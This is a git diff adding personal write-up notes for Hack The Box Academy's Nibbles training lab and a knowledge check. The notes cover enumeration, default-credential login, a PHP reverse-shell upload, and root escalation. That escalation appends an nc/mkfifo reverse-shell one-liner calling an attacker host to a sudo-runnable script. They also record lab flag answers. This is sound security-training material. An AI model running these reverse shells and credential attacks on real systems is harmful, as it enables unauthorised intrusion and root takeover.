@@ -197,12 +197,147 @@ sudo nmap -sC -sV $ip
 **Results**:  2.4.18
 
 
-### [Nibbles - Web Footprinting](# Nibbles - Web Footprinting)
+### [# Nibbles - Initial Foothold](https://academy.hackthebox.com/module/77/section/852)
 
+**Gain a foothold on the target and submit the user.txt flag**
+
+Enumerate resources
 
 
 ```
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://$ip/nibbleblog/FUZZ -H "HOST: $ip$"
 
+dirb http://$ip/nibbleblog/
 ```
 
-**Results**:  2.4.18
+There are a lot of directory listing enabled. And eventually we can browser to:
+http://$ip/nibbleblog/content/private/users.xml
+
+We can identify the user admin.
+
+![admin user](img/htb-nibble_00.png)
+
+We could also enumerate http://$ip/nibbleblog/admin.php
+
+Login access is admin:nibbles.
+
+Go to Plugins tab and locate MyImage one: http://$ip/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image
+
+Upload a PHP reverse shell, go to http://$IP/nibbleblog/content/private/plugins/my_image/ 
+
+Set a netcat listener
+
+```
+nc -lnvp 1234
+```
+
+Click on the reverse shell "image.php" and we will get a reverse shell.
+
+```
+whoami
+#nibbler
+
+cat /home/nibbler/user.txt
+```
+
+
+
+**Results**:  79c03865431abf47b90ef24b9695e14879c03865431abf47b90ef24b9695e148
+
+
+### [Nibbles - Privilege Escalation](https://academy.hackthebox.com/module/77/section/853)
+
+Escalate privileges and submit the root.txt flag.
+
+```
+cd /home/nibbler
+```
+
+
+```
+sudo -l
+```
+
+Results:
+
+```
+Matching Defaults entries for nibbler on Nibbles:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+```
+
+The `nibbler` user can run the file `/home/nibbler/personal/stuff/monitor.sh` with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with `sudo` we should get a reverse shell back as the root user.
+
+```
+unzip personal.zip
+strings /home/nibbler/personal/stuff/monitor.sh
+```
+
+
+```
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IPattacker 8443 >/tmp/f' | tee -a monitor.sh
+```
+
+In the attacker machine, open a new netcat:
+
+```
+nc -lnvp 8443
+```
+
+Run monitor.sh with sudo
+
+```
+sudo ./monitor.sh
+```
+
+In the new netcat connection you are root.
+
+```
+cat /root/root.txt
+```
+
+
+**Results**: de5e5d6619862a8aa5b9b212314e0cdd
+
+
+Alternative way: Metasploit 
+
+```shell-session
+exploit/multi/http/nibbleblog_file_upload
+```
+
+
+### [Knowledge Check](https://academy.hackthebox.com/module/77/section/859)
+
+**Spawn the target, gain a foothold and submit the contents of the user.txt flag.**
+
+```
+sudo nmap -sC -sV $ip
+```
+
+Go to http://$ip/robots.txt
+
+Go to http://$ip/admin
+
+Enter admin:admin
+
+Go to Edit Theme: http://$ip/admin/theme-edit.php
+
+Add a pentesmonkey shell and set a netcat listener on port 1234
+
+Add gettingstarte.htb to your hosts file
+
+Open the blog and you will get a reverse shell
+
+```
+cat /home/mrb3n/user.txt
+```
+
+**Results**: 7002d65b149b0a4d19132a66feed21d8
+
+
+**After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.**
+
+
